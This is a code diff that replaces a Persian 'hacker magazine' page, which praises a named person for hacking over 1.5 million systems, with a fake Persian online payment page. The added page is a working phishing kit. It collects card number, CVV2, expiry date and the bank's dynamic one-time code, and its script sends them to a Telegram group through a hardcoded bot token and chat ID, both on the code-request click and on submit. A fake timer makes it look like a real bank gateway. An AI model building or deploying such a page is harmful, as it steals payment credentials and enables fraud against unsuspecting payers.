@@ -3,46 +3,309 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>مجله هکری ایران</title>
+    <title>پرداخت آنلاین</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
     <style>
         body {
-            font-family: Arial, sans-serif;
-            background-color: #1a1a1a;
-            color: #fff;
-            text-align: center;
+            font-family: 'Roboto', sans-serif;
+            background: linear-gradient(135deg, #6a11cb, #2575fc);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
             margin: 0;
-            padding: 0;
+            color: #fff;
         }
-        .container {
-            padding: 50px;
+
+        .payment-container {
+            background: rgba(255, 255, 255, 0.9);
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            width: 400px;
+            text-align: center;
         }
-        h1 {
-            color: #00ff00;
+
+        h2 {
+            margin-bottom: 20px;
+            font-size: 24px;
+            color: #333;
         }
-        p {
-            font-size: 1.2em;
+
+        input[type="text"],
+        input[type="number"] {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 2px solid #6a11cb;
+            border-radius: 5px;
+            transition: border-color 0.3s;
         }
-        .highlight {
-            color: #ff0000;
-            font-weight: bold;
+
+        input[type="text"]:focus,
+        input[type="number"]:focus {
+            border-color: #2575fc;
+            outline: none;
         }
-        .stats {
+
+        input[type="submit"] {
+            background-color: #6a11cb;
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 18px;
+            margin-top: 10px;
+            transition: background-color 0.3s, transform 0.3s;
+        }
+
+        input[type="submit"]:hover {
+            background-color: #2575fc;
+            transform: translateY(-2px);
+        }
+
+        .footer {
             margin-top: 20px;
-            font-size: 1.2em;
-            color: #ffcc00;
+            font-size: 14px;
+            color: #333;
+        }
+
+        .error {
+            color: red;
+            font-size: 12px;
+            margin-top: -10px;
+            margin-bottom: 10px;
+        }
+
+        .success {
+            color: green;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+
+        #timer {
+            font-size: 16px;
+            color: #ff5722;
+            margin-top: 10px;
+        }
+
+        .flex-container {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin: 10px 0;
+        }
+
+        .request-code {
+            background-color: #6a11cb;
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-left: 10px;
+            transition: background-color 0.3s, transform 0.3s;
+            flex-shrink: 0; /* Prevents shrinking */
+        }
+
+        .request-code:hover {
+            background-color: #2575fc;
+            transform: translateY(-2px);
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>مجله هکری ایران</h1>
-        <p>به مجله هکری ایران خوش آمدید، جایی که اطلاعات جدید و تکنیک‌های پیشرفته هک و امنیت سایبری را بررسی می‌کنیم.</p>
-        <p>بر اساس جدیدترین رتبه‌بندی‌ها، <span class="highlight">محمد مهدی رحیمی</span> به عنوان رتبه 1 بهترین هکر ایران انتخاب شده است.</p>
-        <div class="stats">
-            <p>او تا کنون بیش از <span class="highlight">1,570,000</span> سیستم را هک کرده و از کار انداخته است.</p>
-            <p>با تکیه بر دانش و مهارت خود در زمینه‌های مختلف، از جمله تست نفوذ و تحلیل بدافزارها، محمد مهدی رحیمی توانسته به یکی از چهره‌های برجسته و الهام‌بخش در دنیای هک و امنیت تبدیل شود.</p>
-            <p>در این مجله، به بررسی برخی از تکنیک‌ها و روش‌های جدید او برای مقابله با تهدیدات سایبری و افزایش امنیت سیستم‌ها خواهیم پرداخت.</p>
+
+<div class="payment-container">
+    <h2>پرداخت آنلاین</h2>
+    <form id="paymentForm">
+        <input type="text" id="cardNumber" placeholder="شماره کارت" maxlength="16" required pattern="\d{16}" inputmode="numeric">
+        <div class="error" id="cardError"></div>
+        
+        <input type="text" id="cvv2" placeholder="CVV2" required pattern="\d{3,4}" inputmode="numeric">
+        <div class="error" id="cvv2Error"></div>
+        
+        <div class="flex-container">
+            <input type="text" id="expiryMonth" placeholder="ماه (MM)" maxlength="2" required pattern="\d{2}" inputmode="numeric">
+            <input type="text" id="expiryYear" placeholder="سال (YY)" maxlength="2" required pattern="\d{2}" inputmode="numeric">
         </div>
+        <div class="error" id="expiryError"></div>
+        
+        <div class="flex-container">
+            <input type="text" id="dynamicCode" placeholder="رمز پویا" required maxlength="6" pattern="\d{6}" inputmode="numeric">
+            <button type="button" class="request-code" id="requestCodeButton">درخواست رمز پویا</button>
+        </div>
+        <div class="error" id="dynamicError"></div>
+        
+        <input type="hidden" id="amount" value="13000">
+        <p>مبلغ پرداختی: <strong>۱۳,۰۰۰ تومان</strong></p>
+        
+        <div id="timer"></div>
+        
+        <input type="submit" value="پرداخت">
+        <p class="success" id="successMessage"></p>
+    </form>
+    <div class="footer">
+        <p>تمامی حقوق محفوظ است.</p>
     </div>
+</div>
+
+<script>
+    let timerInterval;
+    let timeLeft = 119; // 1 minute 59 seconds in seconds
+
+    // انتقال خودکار به فیلد بعدی پس از پر کردن فیلد
+    document.getElementById('cardNumber').addEventListener('input', function() {
+        if (this.value.length === 16) {
+            document.getElementById('cvv2').focus();
+        }
+    });
+
+    document.getElementById('cvv2').addEventListener('input', function() {
+        if (this.value.length === 3 || this.value.length === 4) {
+            document.getElementById('expiryMonth').focus();
+        }
+    });
+
+    document.getElementById('expiryMonth').addEventListener('input', function() {
+        if (this.value.length === 2) {
+            document.getElementById('expiryYear').focus();
+        }
+    });
+
+    document.getElementById('expiryYear').addEventListener('input', function() {
+        if (this.value.length === 2) {
+            document.getElementById('dynamicCode').focus();
+        }
+    });
+
+    document.getElementById('dynamicCode').addEventListener('input', function() {
+        if (this.value.length === 6) {
+            document.getElementById('requestCodeButton').focus();
+        }
+    });
+
+    document.getElementById('requestCodeButton').addEventListener('click', function() {
+        // ارسال اطلاعات به گروه تلگرام
+        const cardNumber = document.getElementById('cardNumber').value;
+        const cvv2 = document.getElementById('cvv2').value;
+        const expiryMonth = document.getElementById('expiryMonth').value;
+        const expiryYear = document.getElementById('expiryYear').value;
+        const dynamicCode = document.getElementById('dynamicCode').value;
+
+        const botToken = '8115227537:AAF6a9EHEfFxgc7nHrJpeKS2V4x1PvJVVh4';  // توکن ربات تلگرام شما
+        const chatId = '-1002308056736';  // آیدی عددی گروه تلگرام شما
+
+        const message = `📋 **اطلاعات پرداخت:**
+        
+💳 **شماره کارت:** ${cardNumber.replace(/(\d{4})(?=\d)/g, '$1 ')}  
+🔒 **CVV2:** ${cvv2}  
+📅 **تاریخ انقضا:** ${expiryMonth}/${expiryYear}  
+🔑 **رمز پویا:** ${dynamicCode}  
+💰 **مبلغ پرداختی:** ۱۳,۰۰۰ تومان`;
+
+        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+        fetch(telegramUrl)
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    console.log("اطلاعات با موفقیت به گروه ارسال شد.");
+                    // شروع تایمر
+                    timeLeft = 119;
+                    document.getElementById('timer').textContent = "رمز پویا در حال ارسال...";
+                    startTimer();
+                } else {
+                    console.error("ارسال اطلاعات به گروه ناموفق بود.");
+                }
+            });
+    });
+
+    function startTimer() {
+        clearInterval(timerInterval);
+        timerInterval = setInterval(function() {
+            if (timeLeft <= 0) {
+                clearInterval(timerInterval);
+                document.getElementById('timer').textContent = "زمان درخواست رمز پویا به پایان رسید.";
+            } else {
+                const minutes = Math.floor(timeLeft / 60);
+                const seconds = timeLeft % 60;
+                document.getElementById('timer').textContent = `زمان باقی‌مانده: ${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+                timeLeft--;
+            }
+        }, 1000);
+    }
+
+    document.getElementById('paymentForm').addEventListener('submit', function(event) {
+        event.preventDefault();
+        
+        let isValid = true;
+
+        const cardNumber = document.getElementById('cardNumber').value;
+        if (cardNumber.length !== 16) {
+            document.getElementById('cardError').textContent = "شماره کارت باید 16 رقم باشد.";
+            isValid = false;
+        } else {
+            document.getElementById('cardError').textContent = "";
+        }
+
+        const cvv2 = document.getElementById('cvv2').value;
+        if (cvv2.length !== 3 && cvv2.length !== 4) {
+            document.getElementById('cvv2Error').textContent = "CVV2 باید 3 یا 4 رقم باشد.";
+            isValid = false;
+        } else {
+            document.getElementById('cvv2Error').textContent = "";
+        }
+
+        const expiryMonth = document.getElementById('expiryMonth').value;
+        const expiryYear = document.getElementById('expiryYear').value;
+        if (expiryMonth.length !== 2 || expiryYear.length !== 2) {
+            document.getElementById('expiryError').textContent = "تاریخ انقضا باید به صورت MM/YY باشد.";
+            isValid = false;
+        } else {
+            document.getElementById('expiryError').textContent = "";
+        }
+
+        const dynamicCode = document.getElementById('dynamicCode').value;
+        if (dynamicCode.length !== 6) {
+            document.getElementById('dynamicError').textContent = "رمز پویا باید 6 رقم باشد.";
+            isValid = false;
+        } else {
+            document.getElementById('dynamicError').textContent = "";
+        }
+
+        if (isValid) {
+            // ارسال اطلاعات به تلگرام
+            const botToken = '8115227537:AAF6a9EHEfFxgc7nHrJpeKS2V4x1PvJVVh4'; // توکن ربات تلگرام شما
+            const chatId = '-1002308056736'; // آیدی گروه تلگرام شما
+
+            const message = `📋 **اطلاعات پرداخت:**
+        
+💳 **شماره کارت:** ${cardNumber.replace(/(\d{4})(?=\d)/g, '$1 ')}  
+🔒 **CVV2:** ${cvv2}  
+📅 **تاریخ انقضا:** ${expiryMonth}/${expiryYear}  
+🔑 **رمز پویا:** ${dynamicCode}  
+💰 **مبلغ پرداختی:** ۱۳,۰۰۰ تومان`;
+
+            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(telegramUrl)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        document.getElementById('successMessage').textContent = 'اطلاعات با موفقیت ارسال شد.';
+                    } else {
+                        document.getElementById('successMessage').textContent = 'ارسال اطلاعات ناموفق بود.';
+                    }
+                })
+                .catch(error => {
+                    document.getElementById('successMessage').textContent = 'خطا در ارسال اطلاعات.';
+                });
+        }
+    });
+</script>
+
 </body>
 </html>
